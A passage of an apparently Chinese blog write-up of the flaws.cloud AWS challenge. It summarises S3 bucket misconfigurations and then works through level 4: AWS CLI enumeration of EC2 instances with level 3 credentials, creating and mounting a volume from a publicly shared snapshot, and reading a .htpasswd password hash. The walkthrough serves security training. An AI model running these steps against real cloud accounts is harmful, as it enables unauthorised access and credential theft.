number">13</span>:15:42 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud<span class="token number">2017</span>-02-27 02:29:03 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud<span class="token number">2017</span>-02-27 02:49:31 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud<span class="token number">2017</span>-02-27 03:49:03 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud<span class="token number">2017</span>-02-27 03:48:40 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud<span class="token number">2017</span>-02-27 04:07:13 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud</code></pre><p>成功通关level 3，并找到level 4的入口。</p><h2 id="0x04-Level-1-3-小结"><a href="#0x04-Level-1-3-小结" class="headerlink" title="0x04 Level 1-3 小结"></a>0x04 Level 1-3 小结</h2><p>至此，涉及到S3存储桶的挑战（level 1-3）已经全部通关，这里进行一个小结：</p><p>在AWS中，可以在S3存桶中可以配置各种权限的功能，包括用来托管静态网站。如果使用了过于宽松的权限，比如将访问权限设置为<code>Everyone</code>，就有可能像访问Web服务器目录列表一样访问S3存储桶的列表，就可能造成信息泄露。hackone平台上的几个类似的漏洞报告，包括针对Shopify、Udemy等厂家的S3文件目录暴露，读写S3的权限等：<a href="https://hackerone.com/reports/163476">https://hackerone.com/reports/163476</a> ，<a href="https://hackerone.com/reports/57505">https://hackerone.com/reports/57505</a> ，<a href="https://hackerone.com/reports/111643">https://hackerone.com/reports/111643</a> ，<a href="https://hackerone.com/reports/131468">https://hackerone.com/reports/131468</a> 。</p><p>如果出现的了将访问权限错误的这是为<code>Any Authenticated AWS User</code>，即任何身份认证的AWS用户，而错误的认为这只是对自己的其他用户开放，依然会造成一个跨权限的访问。这里给出hackerone平台上针对Shopify的一个漏洞报告进行参考：<a href="https://hackerone.com/reports/98819">https://hackerone.com/reports/98819</a> 。</p><p>AWS秘钥泄露时常出现，这里提供一篇关于Instagram的百万美元的漏洞文章进行学习——Instagram’s Million Dollar Bug：<a href="http://www.exfiltrated.com/research-Instagram-RCE.php">http://www.exfiltrated.com/research-Instagram-RCE.php</a> 。这篇文章中，安全研究员发现了一系列缺陷，包括一个S3桶，其中包含.tar.gz存档的各种修订文件，而其中一个档案包含了<code>AWS credentials</code>，使得研究人员访问所Instagram所有的S3存储桶。</p><h2 id="0x05-Level-4"><a href="#0x05-Level-4" class="headerlink" title="0x05 Level 4"></a>0x05 Level 4</h2><blockquote><p>For the next level, you need to get access to the web page running on an EC2 at <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/">4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</a></p><p>It’ll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.</p></blockquote><p>我们的目标是进入<code>4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</code>，直接用浏览器打开，提示需要账号密码：</p><p><img src="https://p4.ssl.qhimg.com/t01702b4808c239fe1a.png"></p><p><img src="https://p1.ssl.qhimg.com/t01cd5df690a898e118.png"></p><p>在level 4 挑战的描述中，我们知道，当nginx在EC2上部署后，会创建一个快照（EBS snapshot）。由这一思路出发，利用level 3中取得的账户查询flaws上运行的EC2实例的信息:</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws ec2 describe-instances --profile flaws<span class="token punctuation">&#123;</span>    <span class="token string">"Reservations"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token string">"Instances"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                    <span class="token string">"Monitoring"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                        <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token string">"disabled"</span>                    <span class="token punctuation">&#125;</span>,                    <span class="token string">"PublicDnsName"</span><span class="token builtin class-name">:</span> <span class="token string">"ec2-35-165-182-7.us-west-2.compute.amazonaws.com"</span>,                    <span class="token string">"StateReason"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                        <span class="token string">"Message"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,                        <span class="token string">"Code"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>                    <span class="token punctuation">&#125;</span>,                    <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                        <span class="token string">"Code"</span><span class="token builtin class-name">:</span> <span class="token number">16</span>,                        <span class="token string">"Name"</span><span class="token builtin class-name">:</span> <span class="token string">"running"</span>                    <span class="token punctuation">&#125;</span>,                    <span class="token string">"EbsOptimized"</span><span class="token builtin class-name">:</span> false,                    <span class="token string">"LaunchTime"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-12T22:29:24.000Z"</span>,                    <span class="token string">"PublicIpAddress"</span><span class="token builtin class-name">:</span> <span class="token string">"35.165.182.7"</span>,                    <span class="token string">"PrivateIpAddress"</span><span class="token builtin class-name">:</span> <span class="token string">"172.31.41.84"</span>,                    <span class="token string">"ProductCodes"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,                    <span class="token string">"VpcId"</span><span class="token builtin class-name">:</span> <span class="token string">"vpc-1052ce77"</span>,                    <span class="token string">"CpuOptions"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                        <span class="token string">"CoreCount"</span><span class="token builtin class-name">:</span> <span class="token number">1</span>,                        <span class="token string">"ThreadsPerCore"</span><span class="token builtin class-name">:</span> <span class="token number">1</span>                    <span class="token punctuation">&#125;</span>,                    <span class="token string">"StateTransitionReason"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,                    <span class="token string">"InstanceId"</span><span class="token builtin class-name">:</span> <span class="token string">"i-05bef8a081f307783"</span>,                    <span class="token string">"ImageId"</span><span class="token builtin class-name">:</span> <span class="token string">"ami-7c803d1c"</span>,                    <span class="token string">"PrivateDnsName"</span><span class="token builtin class-name">:</span> <span class="token string">"ip-172-31-41-84.us-west-2.compute.internal"</span>,                    <span class="token string">"KeyName"</span><span class="token builtin class-name">:</span> <span class="token string">"Default"</span>,                    <span class="token string">"SecurityGroups"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>                        <span class="token punctuation">&#123;</span>                            <span class="token string">"GroupName"</span><span class="token builtin class-name">:</span> <span class="token string">"launch-wizard-1"</span>,                            <span class="token string">"GroupId"</span><span class="token builtin class-name">:</span> <span class="token string">"sg-490f6631"</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">]</span>,                    <span class="token string">"ClientToken"</span><span class="token builtin class-name">:</span> <span class="token string">"kTOiC1486938563883"</span>,                    <span class="token string">"SubnetId"</span><span class="token builtin class-name">:</span> <span class="token string">"subnet-d962aa90"</span>,                    <span class="token string">"InstanceType"</span><span class="token builtin class-name">:</span> <span class="token string">"t2.micro"</span>,                    <span class="token string">"CapacityReservationSpecification"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                        <span class="token string">"CapacityReservationPreference"</span><span class="token builtin class-name">:</span> <span class="token string">"open"</span>                    <span class="token punctuation">&#125;</span>,                    <span class="token string">"NetworkInterfaces"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>                        <span class="token punctuation">&#123;</span>                            <span class="token string">"Status"</span><span class="token builtin class-name">:</span> <span class="token string">"in-use"</span>,                            <span class="token string">"MacAddress"</span><span class="token builtin class-name">:</span> <span class="token string">"06:b0:7a:92:21:cf"</span>,                            <span class="token string">"SourceDestCheck"</span><span class="token builtin class-name">:</span> true,                            <span class="token string">"VpcId"</span><span class="token builtin class-name">:</span> <span class="token string">"vpc-1052ce77"</span>,                            <span class="token string">"Description"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,                            <span class="token string">"NetworkInterfaceId"</span><span class="token builtin class-name">:</span> <span class="token string">"eni-c26ed780"</span>,                            <span class="token string">"PrivateIpAddresses"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>                                <span class="token punctuation">&#123;</span>                                    <span class="token string">"PrivateDnsName"</span><span class="token builtin class-name">:</span> <span class="token string">"ip-172-31-41-84.us-west-2.compute.internal"</span>,                                    <span class="token string">"PrivateIpAddress"</span><span class="token builtin class-name">:</span> <span class="token string">"172.31.41.84"</span>,                                    <span class="token string">"Primary"</span><span class="token builtin class-name">:</span> true,                                    <span class="token string">"Association"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                                        <span class="token string">"PublicIp"</span><span class="token builtin class-name">:</span> <span class="token string">"35.165.182.7"</span>,                                        <span class="token string">"PublicDnsName"</span><span class="token builtin class-name">:</span> <span class="token string">"ec2-35-165-182-7.us-west-2.compute.amazonaws.com"</span>,                                        <span class="token string">"IpOwnerId"</span><span class="token builtin class-name">:</span> <span class="token string">"amazon"</span>                                    <span class="token punctuation">&#125;</span>                                <span class="token punctuation">&#125;</span>                            <span class="token punctuation">]</span>,                            <span class="token string">"PrivateDnsName"</span><span class="token builtin class-name">:</span> <span class="token string">"ip-172-31-41-84.us-west-2.compute.internal"</span>,                            <span class="token string">"InterfaceType"</span><span class="token builtin class-name">:</span> <span class="token string">"interface"</span>,                            <span class="token string">"Attachment"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                                <span class="token string">"Status"</span><span class="token builtin class-name">:</span> <span class="token string">"attached"</span>,                                <span class="token string">"DeviceIndex"</span><span class="token builtin class-name">:</span> <span class="token number">0</span>,                                <span class="token string">"DeleteOnTermination"</span><span class="token builtin class-name">:</span> true,                                <span class="token string">"AttachmentId"</span><span class="token builtin class-name">:</span> <span class="token string">"eni-attach-a4901fc2"</span>,                                <span class="token string">"AttachTime"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-12T22:29:24.000Z"</span>                            <span class="token punctuation">&#125;</span>,                            <span class="token string">"Groups"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>                                <span class="token punctuation">&#123;</span>                                    <span class="token string">"GroupName"</span><span class="token builtin class-name">:</span> <span class="token string">"launch-wizard-1"</span>,                                    <span class="token string">"GroupId"</span><span class="token builtin class-name">:</span> <span class="token string">"sg-490f6631"</span>                                <span class="token punctuation">&#125;</span>                            <span class="token punctuation">]</span>,                            <span class="token string">"Ipv6Addresses"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,                            <span class="token string">"OwnerId"</span><span class="token builtin class-name">:</span> <span class="token string">"975426262029"</span>,                            <span class="token string">"PrivateIpAddress"</span><span class="token builtin class-name">:</span> <span class="token string">"172.31.41.84"</span>,                            <span class="token string">"SubnetId"</span><span class="token builtin class-name">:</span> <span class="token string">"subnet-d962aa90"</span>,                            <span class="token string">"Association"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                                <span class="token string">"PublicIp"</span><span class="token builtin class-name">:</span> <span class="token string">"35.165.182.7"</span>,                                <span class="token string">"PublicDnsName"</span><span class="token builtin class-name">:</span> <span class="token string">"ec2-35-165-182-7.us-west-2.compute.amazonaws.com"</span>,                                <span class="token string">"IpOwnerId"</span><span class="token builtin class-name">:</span> <span class="token string">"amazon"</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">]</span>,                    <span class="token string">"SourceDestCheck"</span><span class="token builtin class-name">:</span> true,                    <span class="token string">"Placement"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                        <span class="token string">"Tenancy"</span><span class="token builtin class-name">:</span> <span class="token string">"default"</span>,                        <span class="token string">"GroupName"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,                        <span class="token string">"AvailabilityZone"</span><span class="token builtin class-name">:</span> <span class="token string">"us-west-2a"</span>                    <span class="token punctuation">&#125;</span>,                    <span class="token string">"Hypervisor"</span><span class="token builtin class-name">:</span> <span class="token string">"xen"</span>,                    <span class="token string">"BlockDeviceMappings"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>                        <span class="token punctuation">&#123;</span>                            <span class="token string">"DeviceName"</span><span class="token builtin class-name">:</span> <span class="token string">"/dev/sda1"</span>,                            <span class="token string">"Ebs"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                                <span class="token string">"Status"</span><span class="token builtin class-name">:</span> <span class="token string">"attached"</span>,                                <span class="token string">"DeleteOnTermination"</span><span class="token builtin class-name">:</span> true,                                <span class="token string">"VolumeId"</span><span class="token builtin class-name">:</span> <span class="token string">"vol-04f1c039bc13ea950"</span>,                                <span class="token string">"AttachTime"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-12T22:29:25.000Z"</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">]</span>,                    <span class="token string">"Architecture"</span><span class="token builtin class-name">:</span> <span class="token string">"x86_64"</span>,                    <span class="token string">"RootDeviceType"</span><span class="token builtin class-name">:</span> <span class="token string">"ebs"</span>,                    <span class="token string">"IamInstanceProfile"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                        <span class="token string">"Id"</span><span class="token builtin class-name">:</span> <span class="token string">"AIPAIK7LV6U6UXJXQQR3Q"</span>,                        <span class="token string">"Arn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:iam::975426262029:instance-profile/flaws"</span>                    <span class="token punctuation">&#125;</span>,                    <span class="token string">"RootDeviceName"</span><span class="token builtin class-name">:</span> <span class="token string">"/dev/sda1"</span>,                    <span class="token string">"VirtualizationType"</span><span class="token builtin class-name">:</span> <span class="token string">"hvm"</span>,                    <span class="token string">"HibernationOptions"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                        <span class="token string">"Configured"</span><span class="token builtin class-name">:</span> <span class="token boolean">false</span>                    <span class="token punctuation">&#125;</span>,                    <span class="token string">"MetadataOptions"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                        <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token string">"applied"</span>,                        <span class="token string">"HttpEndpoint"</span><span class="token builtin class-name">:</span> <span class="token string">"enabled"</span>,                        <span class="token string">"HttpTokens"</span><span class="token builtin class-name">:</span> <span class="token string">"optional"</span>,                        <span class="token string">"HttpPutResponseHopLimit"</span><span class="token builtin class-name">:</span> <span class="token number">1</span>                    <span class="token punctuation">&#125;</span>,                    <span class="token string">"AmiLaunchIndex"</span><span class="token builtin class-name">:</span> <span class="token number">0</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span>,            <span class="token string">"ReservationId"</span><span class="token builtin class-name">:</span> <span class="token string">"r-0fe151dbbe77e90cc"</span>,            <span class="token string">"Groups"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,            <span class="token string">"OwnerId"</span><span class="token builtin class-name">:</span> <span class="token string">"975426262029"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p>在返回的信息中，在<code>EBS</code>中找到<code>VolumeId</code>，在<code>Association</code>中找到公有IP</p><p><img src="https://p5.ssl.qhimg.com/t01cb1c4ac118142b80.png"></p><p><img src="https://p0.ssl.qhimg.com/t01dab8ab43585c552b.png"></p><p>也就是说，有一个EC2实例在运行，它的<code>VolumeId</code>为<code>vol-04f1c039bc13ea950</code>，IP地址为<code>35.165.182.7</code>。</p><p>为了确认这一发现，利用<code>nslookup</code>工具对level 4中的EC2地址进行解析，发现IP对应一致：</p><p><img src="https://p1.ssl.qhimg.com/t01e8a1ea1ccebfd490.png"></p><p>那么，下一步要做到的就是通过<code>VolumeId</code>寻找EBS快照，看看能不能发现有用的信息：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws ec2 describe-snapshots --filters <span class="token string">"Name=volume-id, Values=vol-04f1c039bc13ea950"</span> --profile flaws<span class="token punctuation">&#123;</span>    <span class="token string">"Snapshots"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token string">"Description"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,            <span class="token string">"Tags"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                    <span class="token string">"Value"</span><span class="token builtin class-name">:</span> <span class="token string">"flaws backup 2017.02.27"</span>,                    <span class="token string">"Key"</span><span class="token builtin class-name">:</span> <span class="token string">"Name"</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span>,            <span class="token string">"Encrypted"</span><span class="token builtin class-name">:</span> false,            <span class="token string">"VolumeId"</span><span class="token builtin class-name">:</span> <span class="token string">"vol-04f1c039bc13ea950"</span>,            <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token string">"completed"</span>,            <span class="token string">"VolumeSize"</span><span class="token builtin class-name">:</span> <span class="token number">8</span>,            <span class="token string">"StartTime"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-28T01:35:12.000Z"</span>,            <span class="token string">"Progress"</span><span class="token builtin class-name">:</span> <span class="token string">"100%"</span>,            <span class="token string">"OwnerId"</span><span class="token builtin class-name">:</span> <span class="token string">"975426262029"</span>,            <span class="token string">"SnapshotId"</span><span class="token builtin class-name">:</span> <span class="token string">"snap-0b49342abd1bdcb89"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p>这里找到<code>&quot;SnapshotId&quot;: &quot;snap-0b49342abd1bdcb89&quot;</code>，接着检查这个快照的<code>createVolumePermission</code>：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flaws<span class="token punctuation">&#123;</span>    <span class="token string">"SnapshotId"</span><span class="token builtin class-name">:</span> <span class="token string">"snap-0b49342abd1bdcb89"</span>,    <span class="token string">"CreateVolumePermissions"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token string">"Group"</span><span class="token builtin class-name">:</span> <span class="token string">"all"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p>哇偶！每个人都能基于这个快照创建一个卷。那么现在就使用自己的AWS账号创建这个快照的卷，这样就能使用自己的SSH秘钥登录EC2实例：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws ec2 create-volume --region us-west-2 --availability-zone us-west-2a --snapshot-id snap-0b49342abd1bdcb89<span class="token punctuation">&#123;</span>    <span class="token string">"AvailabilityZone"</span><span class="token builtin class-name">:</span> <span class="token string">"us-west-2a"</span>,    <span class="token string">"MultiAttachEnabled"</span><span class="token builtin class-name">:</span> false,    <span class="token string">"Tags"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,    <span class="token string">"Encrypted"</span><span class="token builtin class-name">:</span> false,    <span class="token string">"VolumeType"</span><span class="token builtin class-name">:</span> <span class="token string">"gp2"</span>,    <span class="token string">"VolumeId"</span><span class="token builtin class-name">:</span> <span class="token string">"vol-00b0a21eafbe8f81b"</span>,    <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token string">"creating"</span>,    <span class="token string">"Iops"</span><span class="token builtin class-name">:</span> <span class="token number">100</span>,    <span class="token string">"SnapshotId"</span><span class="token builtin class-name">:</span> <span class="token string">"snap-0b49342abd1bdcb89"</span>,    <span class="token string">"CreateTime"</span><span class="token builtin class-name">:</span> <span class="token string">"2020-03-22T08:43:49.000Z"</span>,    <span class="token string">"Size"</span><span class="token builtin class-name">:</span> <span class="token number">8</span><span class="token punctuation">&#125;</span></code></pre><p>在我自己账户的EC2管理平台上，可以看到基于这个快照的卷成功创建：</p><p><img src="https://p0.ssl.qhimg.com/t0146400bfcb5c37686.png"></p><p>随后我开启了一个免费的EC2实例：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws ec2 describe-instances<span class="token punctuation">&#123;</span>    <span class="token punctuation">..</span>.    <span class="token string">"InstanceId"</span><span class="token builtin class-name">:</span> <span class="token string">"i-056b17b87e47e8896"</span>,    <span class="token punctuation">..</span>.<span class="token punctuation">&#125;</span></code></pre><p>下面将卷挂载在/dev/sdf：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws ec2 attach-volume --volume-id vol-00b0a21eafbe8f81b --instance-id i-056b17b87e47e8896 --device /dev/sdf<span class="token punctuation">&#123;</span><span class="token punctuation">..</span>.    <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token string">"attaching"</span>,    <span class="token string">"Device"</span><span class="token builtin class-name">:</span> <span class="token string">"/dev/sdf"</span><span class="token punctuation">&#125;</span></code></pre><p>当我们用自己的SSH秘钥登录这个EC2实例，就能进入快照找寻敏感信息或者文件：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ <span class="token function">ssh</span> -i <span class="token operator">&lt;</span>mykey<span class="token operator">></span> ubuntu@34.*.*.*.*Welcome to Ubuntu <span class="token number">18.04</span>.3 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">4.15</span>.0-1057-aws x86_64<span class="token punctuation">)</span>Welcome to Ubuntu <span class="token number">18.04</span>.3 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">4.15</span>.0-1057-aws x86_64<span class="token punctuation">)</span><span class="token punctuation">..</span>.ubuntu@ip-172-31-21-33:~$ lsblkNAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTloop0     <span class="token number">7</span>:0    <span class="token number">0</span> <span class="token number">89</span>.1M  <span class="token number">1</span> loop /snap/core/8268loop1     <span class="token number">7</span>:1    <span class="token number">0</span>   18M  <span class="token number">1</span> loop /snap/amazon-ssm-agent/1480xvda    <span class="token number">202</span>:0    <span class="token number">0</span>    8G  <span class="token number">0</span> disk└─xvda1 <span class="token number">202</span>:1    <span class="token number">0</span>    8G  <span class="token number">0</span> part /xvdf    <span class="token number">202</span>:80   <span class="token number">0</span>    8G  <span class="token number">0</span> disk└─xvdf1 <span class="token number">202</span>:81   <span class="token number">0</span>    8G  <span class="token number">0</span> part</code></pre><p>可以发现这里有个虚拟盘/dev/xvdf1，创建一个挂载点：</p><pre class="language-shell" data-language="shell"><code class="language-shell">ubuntu@ip-172-31-21-33:~$ <span class="token function">sudo</span> <span class="token function">mkdir</span> /mnt/flawsubuntu@ip-172-31-21-33:~$ <span class="token function">sudo</span> <span class="token function">mount</span> /dev/xvdf1 /mnt/flawsubuntu@ip-172-31-21-33:~$ <span class="token function">mount</span><span class="token punctuation">..</span>./dev/xvdf1 on /mnt/flaws <span class="token builtin class-name">type</span> ext4 <span class="token punctuation">(</span>rw,relatime,data<span class="token operator">=</span>ordered<span class="token punctuation">)</span></code></pre><p>下面进入，看看能发现什么：</p><pre class="language-shell" data-language="shell"><code class="language-shell">ubuntu@ip-172-31-21-33:~$ <span class="token function">ls</span> -l /mnt/flaws/total <span class="token number">104</span>drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Feb <span class="token number">13</span>  <span class="token number">2017</span> bindrwxr-xr-x  <span class="token number">3</span> root root  <span class="token number">4096</span> Feb <span class="token number">22</span>  <span class="token number">2017</span> bootdrwxr-xr-x  <span class="token number">5</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> devdrwxr-xr-x <span class="token number">94</span> root root  <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> etcdrwxr-xr-x  <span class="token number">3</span> root root  <span class="token number">4096</span> Feb <span class="token number">12</span>  <span class="token number">2017</span> homelrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">32</span> Feb <span class="token number">22</span>  <span class="token number">2017</span> initrd.img -<span class="token operator">></span> boot/initrd.img-4.4.0-64-genericlrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">32</span> Feb <span class="token number">21</span>  <span class="token number">2017</span> initrd.img.old -<span class="token operator">></span> boot/initrd.img-4.4.0-63-genericdrwxr-xr-x <span class="token number">21</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> libdrwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> lib64drwx------  <span class="token number">2</span> root root <span class="token number">16384</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> lost+founddrwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> mediadrwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> mntdrwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> optdrwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Apr <span class="token number">12</span>  <span class="token number">2016</span> procdrwx------  <span class="token number">3</span> root root  <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> rootdrwxr-xr-x  <span class="token number">6</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> rundrwxr-xr-x  <span class="token number">2</span> root root <span class="token number">12288</span> Feb <span class="token number">13</span>  <span class="token number">2017</span> sbindrwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan  <span class="token number">3</span>  <span class="token number">2017</span> snapdrwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> srvdrwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Feb  <span class="token number">5</span>  <span class="token number">2016</span> sysdrwxrwxrwt  <span class="token number">8</span> root root  <span class="token number">4096</span> Feb <span class="token number">28</span>  <span class="token number">2017</span> tmpdrwxr-xr-x <span class="token number">10</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> usrdrwxr-xr-x <span class="token number">14</span> root root  <span class="token number">4096</span> Feb <span class="token number">12</span>  <span class="token number">2017</span> varlrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">29</span> Feb <span class="token number">22</span>  <span class="token number">2017</span> vmlinuz -<span class="token operator">></span> boot/vmlinuz-4.4.0-64-genericlrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">29</span> Feb <span class="token number">21</span>  <span class="token number">2017</span> vmlinuz.old -<span class="token operator">></span> boot/vmlinuz-4.4.0-63-generic</code></pre><p>看起来很像一个linux系统，从哪里找到包含认证信息的文件呢？还记得level 4 描述中讲到的“当nginx在EC2上部署后，会创建一个快照”吗？所以nginx是突破点：</p><pre class="language-shell" data-language="shell"><code class="language-shell">ubuntu@ip-172-31-21-33:/mnt/flaws/etc/nginx$ <span class="token function">ls</span> -altotal <span class="token number">68</span>drwxr-xr-x  <span class="token number">6</span> root root <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> <span class="token builtin class-name">.</span>drwxr-xr-x <span class="token number">94</span> root root <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> <span class="token punctuation">..</span>-rw-r--r--  <span class="token number">1</span> root root   <span class="token number">44</span> Feb <span class="token number">13</span>  <span class="token number">2017</span> .htpasswddrwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Oct <span class="token number">27</span>  <span class="token number">2016</span> conf.d-rw-r--r--  <span class="token number">1</span> root root <span class="token number">1077</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> fastcgi.conf-rw-r--r--  <span class="token number">1</span> root root <span class="token number">1007</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> fastcgi_params-rw-r--r--  <span class="token number">1</span> root root <span class="token number">2837</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> koi-utf-rw-r--r--  <span class="token number">1</span> root root <span class="token number">2223</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> koi-win-rw-r--r--  <span class="token number">1</span> root root <span class="token number">3957</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> mime.types-rw-r--r--  <span class="token number">1</span> root root <span class="token number">1533</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> nginx.conf-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">180</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> proxy_params-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">636</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> scgi_paramsdrwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> sites-availabledrwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> sites-enableddrwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Feb <span class="token number">12</span>  <span class="token number">2017</span> snippets-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">664</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> uwsgi_params-rw-r--r--  <span class="token number">1</span> root root <span class="token number">3071</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> win-utf</code></pre><p><code>.htpasswd</code>文件看起来很可疑：</p><pre class="language-shell" data-language="shell"><code class="language-shell">ubuntu@ip-172-31-21-33:/mnt/flaws/etc/nginx$ <span class="token function">cat</span> .htpasswdflaws:<span class="token variable">$apr1</span><span class="token variable">$4ed</span>/7TEL<span class="token variable">$cJnixIRA6P4H8JDvKVMku0</span></code></pre><p>这应该是一串加密的密码，账户：flaws，密码（加密）：$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0。尝试在<a 